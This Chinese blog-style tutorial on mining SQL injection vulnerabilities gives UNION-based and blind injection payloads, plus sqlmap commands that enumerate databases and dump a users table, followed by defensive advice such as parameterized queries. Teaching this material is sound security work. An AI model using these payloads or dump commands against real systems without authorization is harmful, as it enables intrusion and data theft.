---
title: SQL 注入漏洞挖掘实战
date: 2024-01-08
tags: [渗透测试, SQL注入, Web安全]
---

# 🔓 SQL 注入漏洞挖掘实战

<div class="article-meta">
  <span class="meta-item">📅 2024-01-08</span>
  <span class="meta-item">🏷️ 渗透测试</span>
  <span class="meta-item">⏱️ 阅读约 8 分钟</span>
</div>

## 前言

SQL 注入是 Web 安全中最经典的漏洞类型之一。本文将从实战角度出发，详细介绍 SQL 注入的发现、验证和利用过程。

## 漏洞发现

### 1. 参数识别

在渗透测试过程中，我们需要关注所有用户可控的输入点：

```bash
# 常见的注入点
?id=1
?search=keyword
?sort=name
?page=1
```

### 2. 注入检测

使用单引号测试是最基础的方法：

```sql
# 原始请求
GET /user?id=1

# 测试请求
GET /user?id=1'
```

如果返回数据库错误信息，说明可能存在注入点。

## 漏洞利用

### Union 注入示例

```sql
-- 确定列数
?id=1 ORDER BY 5--
?id=1 ORDER BY 6--  -- 报错，说明有5列

-- 确定回显位置
?id=-1 UNION SELECT 1,2,3,4,5--

-- 获取数据库信息
?id=-1 UNION SELECT 1,database(),user(),4,5--

-- 获取表名
?id=-1 UNION SELECT 1,group_concat(table_name),3,4,5 
FROM information_schema.tables 
WHERE table_schema=database()--
```

### 盲注技巧

当没有回显时，可以使用布尔盲注或时间盲注：

```sql
-- 布尔盲注
?id=1 AND (SELECT LENGTH(database()))=5--

-- 时间盲注
?id=1 AND IF(1=1, SLEEP(5), 0)--
```

## 自动化工具

### SQLMap 使用

```bash
# 基础扫描
sqlmap -u "http://target.com/user?id=1" --batch

# 获取数据库
sqlmap -u "http://target.com/user?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/user?id=1" -D database_name --tables

# 获取数据
sqlmap -u "http://target.com/user?id=1" -D database_name -T users --dump
```

## 防御建议

1. **使用参数化查询** - 永远不要拼接 SQL
2. **输入验证** - 对用户输入进行严格过滤
3. **最小权限原则** - 数据库账户只赋予必要权限
4. **WAF 防护** - 部署 Web 应用防火墙

```python
# 安全的参数化查询示例
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

## 总结

SQL 注入虽然是老漏洞，但在实战中依然常见。掌握其原理和利用方法，对于渗透测试和安全研究都至关重要。

---

<div class="article-footer">
  <span class="tag">渗透测试</span>
  <span class="tag">SQL注入</span>
  <span class="tag">Web安全</span>
</div>

<style>
.article-meta {
  display: flex;
  gap: 20px;
  margin: 20px 0 30px;
  padding: 15px;
  background: rgba(0, 255, 255, 0.05);
  border-left: 3px solid var(--neon-cyan);
  border-radius: 0 8px 8px 0;
}

.meta-item {
  color: rgba(255, 255, 255, 0.7);
  font-size: 0.9rem;
}

.article-footer {
  display: flex;
  gap: 10px;
  margin-top: 40px;
  padding-top: 20px;
  border-top: 1px solid rgba(0, 255, 255, 0.2);
}

.tag {
  background: rgba(189, 0, 255, 0.15);
  border: 1px solid rgba(189, 0, 255, 0.3);
  padding: 4px 12px;
  border-radius: 15px;
  font-size: 0.8rem;
  color: #bd00ff;
}
</style>
